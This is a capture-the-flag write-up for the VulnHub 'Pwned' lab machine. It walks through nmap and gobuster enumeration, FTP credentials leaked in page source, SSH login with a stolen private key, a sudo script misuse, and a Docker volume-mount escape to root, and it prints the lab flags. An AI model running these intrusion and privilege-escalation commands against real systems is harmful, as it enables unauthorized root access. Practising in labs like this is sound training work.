# VulnHub - Pwned Machine (10.0.2.9)

Write-up for the vulnerable machine `Pwned` from VulnHub.  
This machine offers a mix of web-based enumeration, FTP access, and privilege escalation via custom scripts and Docker abuse.

---

## 🖥️ Machine Information:

- **IP Address**: `10.0.2.9`
- **Operating System**: Linux (Kernel 4.x - 5.x)
- **Services**:
  - FTP (`vsftpd 3.0.3`)
  - SSH (`OpenSSH 7.9p1`)
  - HTTP (`Apache 2.4.38`)

---

##  Nmap Scan Result:

```
nmap -sC -sV -A -T4 10.0.2.9 -Pn

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service Info: OSs: Unix, Linux
MAC Address: 08:00:27:3B:77:33 (Oracle VirtualBox virtual NIC)



``````

 Web Enumeration with Gobuster
Using gobuster, an interesting directory was discovered:

http://10.0.2.9/hidden_text/

Inside that path, a file named secret.dic revealed the following endpoints:

			[/hacked
			/vanakam_nanba
			/hackerman.gif
			/facebook
			/whatsapp
			/instagram
			/pwned
			/pwned.com
			/pubg
			/cod
			/fortnite
			/youtube
			/kali.org
			/hacked.vuln
			/users.vuln
			/passwd.vuln
			/pwned.vuln  <-- (Interesting!)
			/backup.vuln
			/.ssh
			/root
			/home]


`````
📝 Information Disclosure via Source Code
At the endpoint /pwned.vuln, a comment in the page source disclosed FTP credentials:

					Username: ftpuser

					Password: B0ss_B!TcH


`````````

📁 FTP Access & File Discovery
Upon logging into the FTP service, the following files were found:

id_rsa (Private SSH Key for user: ariana)

note.txt

After securing the key and setting proper permissions:
					
					
					chmod 600 id_rsa
					ssh -i id_rsa ariana@10.0.2.9

````````



 User Flag - ariana
After SSH access:

		"Congratulations, you Pwned ariana.
		Here is your user flag ↓↓↓↓↓↓↓

		fb8d98be1265dd88bac522e1b2182140"
`````


⚙️ Privilege Escalation via sudo
Using sudo -l:

		(ariana) NOPASSWD: /home/messenger.sh
		The messenger.sh script allows execution of /bin/bash, providing shell access as user selena.
````````

User Flag - selena
Once in selena's shell:


		711fdfc6caad532815a440f7f295c176



``````````
 Root Access via Docker Escape
Used Docker container escape to gain root:


		docker run -v /:/mnt --rm -it alpine chroot /mnt sh
		This gave full root access.

`````````

Root Flag
Located in /root:

		4d4098d64e163d2726959455d046fd7c

		You found me. I didn’t expect this （◎ . ◎）

		I am Ajay (Annlynn). I hacked your server and left this for you.
		I trapped Ariana and Selena to takeover your server :)

		You Pwned the Pwned, congratulations :)

















